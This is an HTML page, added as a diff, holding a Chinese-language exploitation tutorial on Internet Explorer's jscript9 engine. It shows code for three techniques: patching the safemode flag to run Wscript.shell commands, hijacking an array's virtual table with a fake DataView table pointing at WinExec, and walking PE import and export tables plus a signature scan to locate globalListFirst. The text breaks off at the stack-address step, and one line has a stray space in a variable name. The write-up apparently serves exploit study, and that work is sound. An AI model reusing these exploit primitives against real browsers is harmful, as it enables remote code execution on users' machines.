@@ -1,0 +1,407 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IE Jscript9的三种代码执行方式</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1><a id="GodMode_0"></a>GodMode</h1>
+<h2><a id="godmode_2"></a>开启godmode</h2>
+<p>以1380为例，当利用UAF可以进行任意地址读写时并泄露任意对象地址时，最简单的利用方式就是借助修改jscript9的safemode去开启godmode开关然后再通过ActiveXObject去访问COM对象执行相关操作</p>
+<p>首先利用在1380分析报告中实现的任意对象地址泄露的方法，泄露ActiveXObject对象地址<br>
+<img src="https://img-blog.csdnimg.cn/4c36b5c75e894e708856b1f39a8c8407.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_9,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+访问0x1c偏移处保存的地址值+0x4处，并获取保存在该地址的值<br>
+<img src="https://img-blog.csdnimg.cn/996d6bf8ada14652a3f2e86be0710da5.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/3459350a02ba4f64bece4a8a9fca57ff.png" alt="在这里插入图片描述"></p>
+<p>访问上文中获取到的地址值+0x1f4偏移处，并将其保存的值改写为0，即可打开godmode<br>
+<img src="https://img-blog.csdnimg.cn/6de5044264d84b419e07da6e14b81a7b.png" alt="在这里插入图片描述"></p>
+<h2><a id="_14"></a>执行代码</h2>
+<p>开启上帝模式后就可以为所欲为了，直接使用ActiveXObject去执行cmd指令起计算器</p>
+<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">Run_ActiveXObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token keyword">var</span> ActiveXObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Wscript.shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			ActiveXObj<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+</code></pre>
+<h1><a id="_23"></a>虚表劫持</h1>
+<h2><a id="_25"></a>虚函数调用</h2>
+<p>在1380中可以通过类型混淆来读写任意对象的内存，这也就意味着可以改写其虚表，当能劫持虚表，控制虚表内虚函数地址时想要此函数被调用还需要找到一处虚函数调用，通过<a href="https://github.com/guhe120/browser/blob/master/GC/jit_calc.html">CVE 2019-1221</a>的EXP代码可以发现在Js::JavascriptOperators::HasItem函数内的一处虚表调用，此函数可以使用in来触发调用。<br>
+举例：</p>
+<pre><code class="prism language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>b <span class="token keyword">in</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
+</code></pre>
+<p>然后在Js::JavascriptOperators::HasItem函数处下断点，当代码运行后断点触发，查看Js::JavascriptOperators::HasItem会发现会有一处：<br>
+<img src="https://img-blog.csdnimg.cn/0a3b2ee18758422b88319c10e5314292.png" alt="在这里插入图片描述"><br>
+此处明显为一处虚函数调用，从对象地址ebx中读取虚表地址，然后从虚表0x7C偏移处获取到一个虚函数，然后使用call esi去调用它<br>
+然后使用ln与dd指令来查看ebx存放着哪个对象<br>
+<img src="https://img-blog.csdnimg.cn/28799367f7ca47dcbbda62af91e50ddb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_14,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+从对象类型以及其中的值来判断，ebx中存放的对象就是js代码中创建的array数组a，所以就可以通过这一特性来改写数组a对象的虚表。然后当代码运行至此的时候就会引用到伪造的虚表。<br>
+仔细观察还会发现在call esi之前还有一句push edx，在此下断，查看edx中数据会发现其值刚好是js代码中变量b的值，利用此特性还能为后面将要调用的函数传参。<br>
+<img src="https://img-blog.csdnimg.cn/60d9b91bdb154f7cb68c4d71ed7dc1ce.png" alt="在这里插入图片描述"></p>
+<h2><a id="_46"></a>通过对象虚表获取模块基址</h2>
+<p>通常情况下，同类对象是共用一张虚表的，此虚表实际存放在模块某一指定偏移处，所以可以通过虚表地址来获取模块基址。<br>
+首先以Array对象为例，它底层是由jscript9中的Js::JavascriptNativeIntArray对象来实现的。<br>
+先通过泄露对象地址取到Js::JavascriptNativeIntArray的虚表地址<br>
+<img src="https://img-blog.csdnimg.cn/702271a51677408ba605c63354b2da88.png" alt="在这里插入图片描述"><br>
+将其低16位置为0，再去判断70df0000处内容是否为MZ，是的话即为当前模块基址<br>
+<img src="https://img-blog.csdnimg.cn/f82ddf6c999f4212975f5d9b57cdd2ab.png" alt="在这里插入图片描述"></p>
+<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">Js_GetCurrentModuleBase</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token comment">//将低16位置0</span>
+			<span class="token keyword">var</span> base <span class="token operator">=</span> addr <span class="token operator">&amp;</span> <span class="token number">0xffff0000</span><span class="token punctuation">;</span>	
+			<span class="token comment">//判断是否是MZ，是的话当前base就是模块基址</span>
+			<span class="token keyword">while</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">{</span>
+				<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">read_32</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x5a4d</span><span class="token punctuation">)</span><span class="token punctuation">{</span>				
+					<span class="token keyword">return</span> base<span class="token punctuation">;</span>
+				<span class="token punctuation">}</span>
+				base <span class="token operator">-=</span> <span class="token number">0x10000</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+</code></pre>
+<h2><a id="IAT_70"></a>通过已知模块IAT表找到指定模块</h2>
+<p>导入表结构体及其相应值偏移：</p>
+<pre><code class="prism language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="token punctuation">{</span>
+<span class="token operator">+</span><span class="token number">0x0</span> 	<span class="token keyword">union</span> <span class="token punctuation">{</span>
+          DWORD Characteristics<span class="token punctuation">;</span>        
+          DWORD OriginalFirstThunk<span class="token punctuation">;</span> <span class="token comment">//该字段指向导入名称表（INT），该RVA是一个IMAGE_THUNK_DATA结构体0x01b218</span>
+     <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token operator">+</span><span class="token number">0x04</span>   DWORD TimeDateStamp<span class="token punctuation">;</span>        <span class="token comment">//可以忽略，一般为0      </span>
+<span class="token operator">+</span><span class="token number">0x08</span>   DWORD ForwarderChain<span class="token punctuation">;</span>       <span class="token comment">//一般为0 </span>
+<span class="token operator">+</span><span class="token number">0x0C</span>   DWORD Name<span class="token punctuation">;</span>                 <span class="token comment">//指向DLL的名称的RVA地址  </span>
+<span class="token operator">+</span><span class="token number">0X10</span>   DWORD FirstThunk<span class="token punctuation">;</span>           <span class="token comment">//该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA结构体数组 0x01b000  0x01b3e0</span>
+<span class="token punctuation">}</span> IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span>
+
+</code></pre>
+<p>拿到jscript9基址后先获取到其导入表所在的偏移0x3C处取到一个数值，用此值+0x80+模块基址即可得到导入表地址偏移<br>
+<img src="https://img-blog.csdnimg.cn/03a6d6fab7004810a9bf1fbfe0f1bbe2.png" alt="在这里插入图片描述"><br>
+用此偏移+模块基址便是导入表的实际地址<br>
+<img src="https://img-blog.csdnimg.cn/5e33e884745e4d81a0aff2ab898dab78.png" alt="在这里插入图片描述"><br>
+导入表+0xC偏移处存放着导入模块名称偏移，用此偏移+当前模块基址得到实际地址<br>
+<img src="https://img-blog.csdnimg.cn/c3ff9fe3b51c46e78ce512e235069a8b.png" alt="在这里插入图片描述"><br>
+然后去以此比较模块名称来找到需要的模块，当没有找到时，使当前导入表地址+0x14找到下一个模块处，以此往复直到找到要找的模块。<br>
+<img src="https://img-blog.csdnimg.cn/3373995f93fd4a07a077fcbed5cb8d6f.png" alt="在这里插入图片描述"><br>
+当找到后，在当前导入表地址处0x10偏移处存放着此模块函数导入地址偏移，用此偏移加模块基址，找到导入函数地址<br>
+<img src="https://img-blog.csdnimg.cn/05b5881d878646ac89017e262c52a9a9.png" alt="在这里插入图片描述"><br>
+得到某一函数后，再利用前面实现的通过虚表获取模块基址的函数，将找到的指定模块中的函数作为参数传入，即可得到模块基址</p>
+<pre><code class="prism language-js"><span class="token keyword">function</span> <span class="token function">Js_GetModuleBase</span><span class="token punctuation">(</span><span class="token parameter">base<span class="token punctuation">,</span> modules_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token comment">//获取IAT表偏移</span>
+			<span class="token keyword">var</span> import_tab_offset <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x3C</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//偏移+基址=实际地址</span>
+			<span class="token keyword">var</span> import_tab_address <span class="token operator">=</span> base <span class="token operator">+</span> import_tab_offset<span class="token punctuation">;</span>
+			<span class="token keyword">var</span> current_tab_addr <span class="token operator">=</span> import_tab_address<span class="token punctuation">;</span>
+			<span class="token keyword">var</span> max <span class="token operator">=</span> import_tab_address <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>
+
+			<span class="token keyword">while</span><span class="token punctuation">(</span>current_tab_addr <span class="token operator">&lt;</span> max<span class="token punctuation">)</span><span class="token punctuation">{</span>
+				<span class="token comment">//IAT表0xC偏移处存放着模块名称字符串偏移，偏移+基址=实际地址</span>
+				<span class="token keyword">var</span> module_name_addr <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>current_tab_addr <span class="token operator">+</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Js_StrCmp</span><span class="token punctuation">(</span>modules_name<span class="token punctuation">,</span> module_name_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+					<span class="token keyword">var</span> IAT_Addr <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>current_tab_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+					<span class="token keyword">var</span> func <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>IAT_Addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+					<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>func<span class="token punctuation">)</span><span class="token punctuation">{</span>
+						IAT_Addr <span class="token operator">+=</span> <span class="token number">0x4</span><span class="token punctuation">;</span>
+						func <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>IAT_Addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+					<span class="token punctuation">}</span>
+					<span class="token keyword">return</span> <span class="token function">Js_GetCurrentModuleBase</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token punctuation">}</span>
+				current_tab_addr <span class="token operator">+=</span> <span class="token number">0x14</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+</code></pre>
+<h2><a id="EAT_131"></a>通过已知模块EAT表找到指定函数</h2>
+<p>导出表结构体及其相应值偏移：</p>
+<pre><code class="prism language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_EXPORT_DIRECTORY</span> <span class="token punctuation">{</span>
+<span class="token operator">+</span><span class="token number">0x00</span>	DWORD Characteristics<span class="token punctuation">;</span>			<span class="token comment">//保留 总是定义为0</span>
+<span class="token operator">+</span><span class="token number">0x04</span>	DWORD TimeDateStamp<span class="token punctuation">;</span>			<span class="token comment">//文件生成时间</span>
+<span class="token operator">+</span><span class="token number">0x08</span>	WORD  MajorVersion<span class="token punctuation">;</span>				<span class="token comment">//主版本号 一般不赋值</span>
+<span class="token operator">+</span><span class="token number">0x0A</span>	WORD  MinorVersion<span class="token punctuation">;</span>				<span class="token comment">//次版本号 一般不赋值</span>
+<span class="token operator">+</span><span class="token number">0x0C</span>	DWORD Name<span class="token punctuation">;</span>						<span class="token comment">//模块的真实名称</span>
+<span class="token operator">+</span><span class="token number">0x10</span>	DWORD Base<span class="token punctuation">;</span>						<span class="token comment">//索引基数 加上序数就是函数地址数组的索引值</span>
+<span class="token operator">+</span><span class="token number">0x14</span>	DWORD NumberOfFunctions<span class="token punctuation">;</span>		<span class="token comment">//地址表中个数</span>
+<span class="token operator">+</span><span class="token number">0x18</span>	DWORD NumberOfNames<span class="token punctuation">;</span>			<span class="token comment">//名称表的个数</span>
+<span class="token operator">+</span><span class="token number">0x1C</span>	DWORD AddressOfFunctions<span class="token punctuation">;</span>		<span class="token comment">//输出函数地址的RVA</span>
+<span class="token operator">+</span><span class="token number">0X20</span>	DWORD AddressOfNames<span class="token punctuation">;</span>			<span class="token comment">//输出函数名字的RVA</span>
+<span class="token operator">+</span><span class="token number">0x24</span>	DWORD AddressOfNameOrdinals<span class="token punctuation">;</span>	<span class="token comment">//输出函数序号的RVA</span>
+<span class="token punctuation">}</span> IMAGE_EXPORT_DIRECTORYM<span class="token punctuation">,</span> <span class="token operator">*</span>pIMAGE_EXPORT_DIRECTORY<span class="token punctuation">;</span>
+</code></pre>
+<p>拿到kernel32.dll模块基址后，用其模块基址+0x3C拿到一个数值，用此值+0x78+模块基址找到导出表偏移地址，用此偏移地址+模块基址找到导出表实际地址<br>
+<img src="https://img-blog.csdnimg.cn/47e4b4dffec04ffda290e32a4c2e3537.png" alt="在这里插入图片描述"><br>
+用EAT表地址分别加0x1C、0x20、0x24分别拿到函数地址表偏移、函数名称表偏移、函数序号表偏移，用偏移+模块基址=实际地址，要注意的是，这些地址中（除序号表外）存放的是实际值所在地址的RVA<br>
+<img src="https://img-blog.csdnimg.cn/ce7d94189bbf4df6be26479bc2cdbb05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_10,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+然后再记得用导出表地址+0x14拿到导出函数个数<br>
+<img src="https://img-blog.csdnimg.cn/eee73b9ca35c4f71873349e6a9e34ea7.png" alt="在这里插入图片描述"><br>
+然后以函数个数为最大值去进行循环遍历查找，函数名称表偏移占4个字节，循环到第几次就用几去乘以4然后加模块基址，直到找到要找的函数<br>
+<img src="https://img-blog.csdnimg.cn/4a3942d6a00942fdb2790bce8224d055.png" alt="在这里插入图片描述"><br>
+找到要找的函数名称后，需要找到其对应的序号，以AddAtomA函数为例，当找到其函数名时是乘以4，想要找到其对应序号就需要用序号表地址+4*2<br>
+<img src="https://img-blog.csdnimg.cn/3c65b50d964b4e02bc53d89f866954b1.png" alt="在这里插入图片描述"><br>
+此处乘以2是由于每个序号只占2字节。<br>
+找到函数序号后，就可以利用其序号来找到其实际函数地址<br>
+用其序号乘以4再加上函数地址表就可以得到函数地址偏移，用此偏移加模块基址便是实际函数地址<br>
+<img src="https://img-blog.csdnimg.cn/7908e0b3232041748b43db43769735b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<pre><code class="prism language-javascript"><span class="token keyword">function</span> <span class="token function">Js_GetProcAddress</span><span class="token punctuation">(</span><span class="token parameter">hModule<span class="token punctuation">,</span> lpProcName</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token comment">//获取导出表偏移</span>
+			<span class="token keyword">var</span> export_tab_offset <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>hModule <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>hModule <span class="token operator">+</span> <span class="token number">0x3C</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//偏移+基址=实际地址</span>
+			<span class="token keyword">var</span> export_table <span class="token operator">=</span> hModule <span class="token operator">+</span> export_tab_offset<span class="token punctuation">;</span>
+			<span class="token comment">//导出函数个数</span>
+			<span class="token keyword">var</span> function_number <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>export_table <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//函数地址表地址</span>
+			<span class="token keyword">var</span> function_address <span class="token operator">=</span> hModule <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>export_table <span class="token operator">+</span> <span class="token number">0x1C</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//函数名称表地址</span>
+			<span class="token keyword">var</span> function_name <span class="token operator">=</span> hModul e <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>export_table <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span>
+			<span class="token comment">//函数序号表地址</span>
+			<span class="token keyword">var</span> function_ordinals <span class="token operator">=</span> hModule <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>export_table <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token comment">//循环遍历查找</span>
+			<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>function_number<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+				<span class="token comment">//获取当前函数名并去匹配</span>
+				<span class="token keyword">var</span> cur_fun_name <span class="token operator">=</span> hModule <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>function_name <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Js_StrCmp</span><span class="token punctuation">(</span>lpProcName<span class="token punctuation">,</span> cur_fun_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+					<span class="token comment">//取当前函数序号</span>
+					<span class="token keyword">var</span> ordinal <span class="token operator">=</span> <span class="token function">read_16</span><span class="token punctuation">(</span>function_ordinals <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+					<span class="token comment">//取实际函数地址</span>
+					<span class="token keyword">var</span> function_ptr <span class="token operator">=</span> hModule <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>function_address <span class="token operator">+</span> ordinal <span class="token operator">*</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+					<span class="token keyword">return</span> function_ptr<span class="token punctuation">;</span>
+				<span class="token punctuation">}</span>
+			<span class="token punctuation">}</span>
+
+			<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+</code></pre>
+<h2><a id="_197"></a>劫持虚表</h2>
+<p>当能从kernel32.dll模块中拿到winexec函数后，就要开始进行虚表劫持，来讲winexec函数地址填入相应位置了。<br>
+首先拿到一个对象的地址，查看其虚表会发现虚表中的函数地址是无法写入的，也就是说无法直接去改虚函数的地址<br>
+<img src="https://img-blog.csdnimg.cn/55d833d10c0a4caaa9eb618a57a7b4a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+再去查看对象的内存属性会发现是可写的，既然无法改写虚表内容，那就直接伪造一张虚表，写给对象就可以了<br>
+<img src="https://img-blog.csdnimg.cn/6dc86ef19f8a499d837d25a87b015816.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_14,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+此处使用DataView去伪造虚表，因为要从虚表0x7c偏移处获取函数地址，使用创建的arraybuffer大于7C即可</p>
+<pre><code class="prism language-js"><span class="token keyword">var</span> fake_vtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>然后取到WinExec函数后将其地址填入fake_vtable+0x7C偏移处，由于直接调用fake_vtable.setUint32填入值会导致字节序被打乱，所以使用在之前写过的任意地址写函数来写入值，但在这之前还需要知道DataView实际存放数据的地址。<br>
+<img src="https://img-blog.csdnimg.cn/3cbceaf7b657422a846eae5b81c2542a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_10,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+由于调试时已经完成虚表劫持部分，所以直接调试，05ba1030+0x7c处的值是手动写入的，而05ba1030又存放在dataview对象的0x1C偏移处，所以从dataview对象的0x1C偏移处就可以拿到实际内容的保存地址，将此地址写入要被劫持的array对象的虚表的位置即可完成虚表劫持。<br>
+然后还要考虑如何传入参数，此处还是使用array（注意如果要传入的参数命令行字符过多时不可使用array，可以使用dataview）</p>
+<pre><code class="prism language-js"><span class="token comment">//参数字符串地址cmd /c calc.exe</span>
+<span class="token keyword">var</span> cmd_line_arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x20646d63</span><span class="token punctuation">,</span><span class="token number">0x6320632f</span><span class="token punctuation">,</span>
+							 <span class="token number">0x2e636c61</span><span class="token punctuation">,</span><span class="token number">0x00657865</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>泄露cmd_line_arr地址后会发现其内容保存在对象0x38偏移处，将其对象地址+0x38便是命令行字符串的地址，将此地址保存，在于被劫持虚表的array对象进行in比较即可<br>
+<img src="https://img-blog.csdnimg.cn/ce5725df4b2340728ef91a3d2b1871d4.png" alt="在这里插入图片描述"></p>
+<h1><a id="_226"></a>栈指针覆盖</h1>
+<h2><a id="globalListFirst_227"></a>寻找globalListFirst</h2>
+<p>由于此漏洞无法直接去覆盖栈内容，但是可以进行任意地址读写，所以需要先找到栈地址，在jscript9中保存有一个全局ThreadContext对象此对象实际上是一个<strong>链表</strong>，可以通过全局变量jscript9!ThreadContext::globalListFirst获取此链表中的第一个节点。<br>
+<img src="https://img-blog.csdnimg.cn/cc43028f55374cc2864cbe89c6e444cb.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/62253e2991c64b5a96a44251f7238d5d.png" alt="在这里插入图片描述"><br>
+此处可以通过偏移来直接获取到globalListFirst，但要注意的是如果jscript9发生改变，此偏移值就有可能会发生改变，所以最保险的方法是通过特征码查找来获取globalListFirst的地址，在jscript9中有函数<code>JsUtil::DoublyLinkedListElement&lt;ThreadContext&gt;::LinkToBeginning&lt;ThreadContext&gt;</code>会去引用globalListFirst，所以可以通过LinkToBeginning函数特征码来获取到globalListFirst<br>
+<img src="https://img-blog.csdnimg.cn/b849f678e1e9462bbe6a913f2ec8dac5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAQW5hbnNpX3NhZmU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>
+可以用<code>JsUtil::DoublyLinkedListElement&lt;ThreadContext&gt;::LinkToBeginning&lt;ThreadContext&gt;</code>函数的前五个字节作为特征码，当找到特征码后直接再向后取四个字节的数，取到的这四个字节，就正好是globalListFirst的地址</p>
+<pre><code class="prism language-js"><span class="token comment">////特征码查找JsUtil::DoublyLinkedListElement::LinkToBeginning()函数地址</span>
+		<span class="token keyword">function</span> <span class="token function">Js_GetLinkToBeginning</span><span class="token punctuation">(</span><span class="token parameter">base</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token keyword">var</span> Hex_code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> address <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> pe_address <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token function">read_32</span><span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x3c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> pe_optheader <span class="token operator">=</span> pe_address<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> code_size <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span>pe_optheader <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> code_base <span class="token operator">=</span> base <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> tmp_address <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+			<span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+			<span class="token keyword">var</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+			<span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> code_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+				<span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">0x5</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+					<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read_8</span><span class="token punctuation">(</span>code_base <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">!=</span> Hex_code<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+						<span class="token keyword">break</span><span class="token punctuation">;</span>
+					<span class="token punctuation">}</span>
+				<span class="token punctuation">}</span>
+				<span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">&gt;=</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+					<span class="token keyword">break</span><span class="token punctuation">;</span>
+				<span class="token punctuation">}</span>
+				code_base<span class="token operator">++</span><span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> code_size<span class="token punctuation">)</span><span class="token punctuation">{</span>
+				address <span class="token operator">=</span> <span class="token function">read_32</span><span class="token punctuation">(</span><span class="token punctuation">(</span>code_base <span class="token operator">+</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token keyword">return</span> address<span class="token punctuation">;</span>
+			<span class="token punctuation">}</span>
+			<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+</code></pre>
+<h2><a id="_269"></a>查找栈地址</h2>
